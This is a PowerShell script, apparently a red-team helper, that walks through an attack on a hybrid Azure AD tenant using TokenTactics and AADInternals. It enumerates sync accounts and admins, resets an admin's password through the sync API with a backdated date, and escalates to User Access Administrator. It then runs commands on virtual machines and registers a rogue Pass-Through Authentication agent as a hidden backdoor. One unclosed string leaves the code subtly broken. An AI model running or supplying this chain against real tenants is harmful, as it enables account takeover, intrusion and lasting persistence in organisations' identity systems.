# Helper script to work with the cloud while Patsy is doing her thing
# Get an access token and save to cache
Write-Output "Repo for TokenTactics https://github.com/rvrsh3ll/TokenTactics"
Write-Output "Importing TokenTactics from current working directory"
Import-Module .\TokenTactics.psd1
# Get-AzureToken -Client MSGraph
#  $response.access_token
#  $response.refresh_token

# Search for ADSync Server
# Attacker - Check Domain Properties of MSOL_* user and ADSync to find Servers
Get-AdUser -Filter * -Properties * | Where {$_.DisplayName -like 'MSOL*'} 
Get-AdUser -Filter * -Properties * | Where {$_.DisplayName -like 'ADSync*'}
Get-AdUser -Filter * -Properties * | Where {$_.DisplayName -like 'AZUREADSSO*'}  

Write-Output "Create Graph Token from User or Sync Creds"
$creds=Get-Credential 
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache

# # List Synced Objects and AzureAD Users
Write-Output "Listing Sync Objects and AzureAD users for immutableIds, SourceAnchors and UPNS"
Write-Output "Those with ImmutableIds are hybrid targets we can reset"
Get-AADIntSyncObjects | Select UserPrincipalName,SourceAnchor,CloudAnchor | Sort UserPrincipalName
Get-AADIntUsers | Select UserPrincipalName,ImmutableId,ObjectId | Sort UserPrincipalName

Read-Host "Press Enter to list Global Admins"

# List Global Admins
Write-Output "Listing AzureAD Global Admin targets.."
$GlobalAdmins = Get-AADIntGlobalAdmins
$GlobalAdmins 

Read-Host "Press Enter to search for additional admins.."
# # Way to find more targets
# # Prompt for credentials for tenant and save the token to cache
#  Will replace with RefreshTo-AzureCoreManagementToken 
Write-Output "Generating Azure Management token to find additional admin targets.."
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache
# Invoke the reconnaissance and save results to a variable
Write-Output "Running recon to find other admins to target.."
$results = Invoke-AADIntReconAsInsider
Write-Output "Listing all admin roles with members:"
$results.roleInformation | Where Members -ne $null | select Name,Members
Write-Output "Displaying Sync status for the directory:"
$results.companyInformation | Select *Sync*

$sourceAnchor = Read-Host "Provide SourceAnchor for a target account that's admin both on-prem and cloud from the list above:"
# $cloudAnchor = Read-Host "Provide CloudAnchor for a target that's cloud admin from the list above to try cloud-only password reset:"
$password = Read-Host "Provide Password to set:" -AsSecureString

Write-Output "Ensuring Password Hash Enabled switch is set so passwords can be reset."
Set-AADIntPasswordHashSyncEnabled -Enabled $true

if ($sourceAnchor -ne $null) {
    Write-Output "Changing the password for $sourceAnchor to $password"
    Set-AADIntUserPassword -SourceAnchor $sourceAnchor -Password $password -ChangeDate (Get-Date).AddYears(-1)
}

if ($cloudAnchor -ne $null) {
    Write-Output "Changing the password for $cloudAnchor to $password"
    Set-AADIntUserPassword -CloudAnchor $cloudAnchor -Password $password -ChangeDate (Get-Date).AddYears(-1)
}

Write-Output "Let's take our new admin for a spin..."
# Get an access token and save it to the cache
Write-Output "Generating AzureCoreManagement token and saving to cache.."
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache
# Grant Azure User Access Administrator role
Write-Output "Elevate our admin to User Acess Administrator." 
Grant-AADIntAzureUserAccessAdminRole
Write-output "Update the token for access to all subscriptions..."
# Update the access token after elevation and save to cache
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache
# Get all subscriptions of the current tenant
Write-Output "Listing all subscriptions we now have access to:"
$subs = Get-AADIntAzureSubscriptions
$subs
$sub1 = $subs[0]
$sub2 = $subs[1]

# Holder for $sub variable
$sub = $sub1

# Virtual Machine Access
Write-Output "Assigning current user Virtual Machine Contributor"
Set-AADIntAzureRoleAssignment -SubscriptionId $sub1 -RoleName "Virtual Machine Contributor"
# Update the access token after role assignment and save to cache
Write-Output "Updating Access Token to encompass new role assignments.."
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache
# List the VMs
Write-Output "Listing Virtual Machines in the subscription:"
$vms = Get-AADIntAzureVMs -SubscriptionId $sub1
$vms

# Remote Code Exec on VM
$server = Read-Host "Enter a VM's name from the output above.."
$group = Read-Host "Enter Resource Group Name for the VM.."
$script = Read-Host "Enter command to run remotely on the VM.."
Write-Output "Executing commands on $server in $group."
Invoke-AADIntAzureVMScript -SubscriptionId $sub -ResourceGroup $group -Server $server -Script $script
# PTA Auth Agent Persistence
# Get access token and save to cache
Write-Output "Generating Token for abusing PTA Authetnication Agent.."
Get-AADIntAccessTokenForPTA -SaveToCache
# Register new authentication agent on Rogue server
Write-Output "Certificate required to register agent."
Write-Output "To Generate Certificate:

Generate private key: openssl genrsa 2048 > private.pem

Generate the self signed certificate: openssl req -x509 -days 1000 -new -key private.pem -out public.pem

Create PFX: openssl pkcs12 -export -in public.pem -inkey private.pem -out mycert.pfx

Write-Output "We can reate our own PTA Backdoor on a VM we control.."
$ourServer = Read-Host "Enter name for our Rogue PTA Server (should blend in)"
$certificate = Read-Host "Enter path to .pfx certificate file for Server ex: .\mycert.pfx"
Write-Output "Registering additional PTA Auth agent on $ourServer using $certificate"
Register-AADIntPTAAgent -MachineName $ourServer -FileName $certificate